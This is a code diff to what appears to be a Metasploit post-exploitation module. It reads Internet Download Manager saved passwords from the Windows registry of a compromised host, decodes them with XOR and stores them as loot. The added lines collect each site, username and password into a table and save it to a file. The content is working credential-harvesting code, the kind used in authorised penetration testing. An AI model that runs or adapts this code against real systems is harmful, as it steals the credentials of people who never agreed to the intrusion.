@@ -52,13 +52,38 @@ class Metasploit3 < Msf::Post
 					return
 				end
 
+				creds = Rex::Ui::Text::Table.new(
+					'Header'  => 'Internet Downloader Manager Credentials',
+					'Ident'   => 1,
+					'Columns' =>
+					[
+						'Site',
+						'User',
+						'Password'
+					]
+				)
+
 				subkeys.each do |site|
 					user = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "User")
 					epass = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "EncPassword")
 					next if epass == nil or epass == ""
 					pass = xor(epass)
 					print_good("Site: #{site} (User=#{user}, Password=#{pass})")
+					creds << [site, user, pass]
 				end
+
+				print_status("Storing data...")
+				path = store_loot(
+					'idm.user.creds',
+					'text/plain',
+					session,
+					creds,
+					'idm_user_creds.txt',
+					'Internet Download Manager User Credentials'
+				)
+
+				print_status("IDM user credentials saved in: #{path}")
+
 			rescue ::Exception => e
 				print_error("An error has occured: #{e.to_s}")
 			end
